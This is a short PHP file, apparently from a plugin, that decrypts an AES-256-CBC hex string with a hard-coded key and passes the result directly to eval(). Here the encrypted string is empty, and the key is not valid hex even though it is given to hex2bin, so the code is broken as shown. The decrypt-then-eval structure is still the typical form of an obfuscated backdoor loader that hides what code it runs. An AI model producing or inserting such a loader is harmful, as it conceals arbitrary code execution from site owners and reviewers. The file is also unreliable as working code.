<?php 
$string= '';

function decrypt_code($encrypted_code_hex, $key) {
    $key = hex2bin($key);
    $encrypted_code_with_iv = hex2bin($encrypted_code_hex);
    $iv = substr($encrypted_code_with_iv, 0, 16);

    $encrypted_code = substr($encrypted_code_with_iv, 16);
    $decrypted_code = openssl_decrypt($encrypted_code, 'aes-256-cbc', $key, OPENSSL_RAW_DATA, $iv);
    
    return $decrypted_code;
}

$decoded = decrypt_code($string, 'aikctpluginfreeapikey');
eval($decoded);
?>
